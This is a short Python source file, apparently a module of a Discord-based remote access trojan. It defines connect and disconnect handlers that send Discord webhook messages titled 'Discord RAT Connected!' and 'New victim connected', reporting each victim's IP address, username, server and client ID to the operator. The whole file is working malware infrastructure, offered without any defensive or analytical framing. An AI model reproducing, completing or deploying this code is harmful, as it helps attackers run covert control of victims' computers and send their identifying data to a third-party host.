from dhooks import Webhook as web
from dhooks import Embed

class Weboh():
    def on_connect(self, **kwargs):
        ip = kwargs.get('ip')
        username = kwargs.get('username')
        server = kwargs.get('server')
        webhook = kwargs.get('webhook')
        avatar = kwargs.get('avatar')
        footer = kwargs.get('footer')
        sid = kwargs.get('sid')
        
        embed = Embed(
            description='New victim connected to server',
            color=11795068,
            timestamp='now'  # sets the timestamp to current time
        )

        embed.set_author(name="Discord RAT Connected!", icon_url=avatar)
        embed.set_footer(text=footer, icon_url=avatar)
        embed.add_field(name="IP:", value=f'`{ip}`')
        embed.add_field(name="Name", value=f'`{username}`')
        embed.add_field(name='Server:', value=f'[{server}]({server})')
        embed.add_field(name='Client ID:', value=f'`{sid}`')
        
        webx = web(webhook)    
        webx.send(embed=embed)
        
    def on_disconnect(self, **kwargs):
        ip = kwargs.get('ip')
        username = kwargs.get('username')
        server = kwargs.get('server')
        webhook = kwargs.get('webhook')
        avatar = kwargs.get('avatar')
        footer = kwargs.get('footer')
        sid = kwargs.get('sid')
        
        embed = Embed(
            description='Victim disconnected from the server',
            color=16399677,
            timestamp='now'  # sets the timestamp to current time
        )

        embed.set_author(name="Discord RAT Disconnected!", icon_url=avatar)
        embed.set_footer(text=footer, icon_url=avatar)
        embed.add_field(name="IP:", value=f'`{ip}`')
        embed.add_field(name="Name", value=f'`{username}`')
        embed.add_field(name='Server:', value=f'[{server}]({server})')
        embed.add_field(name='Client ID:', value=f'`{sid}`')
        
        webx = web(webhook)    
        webx.send(embed=embed)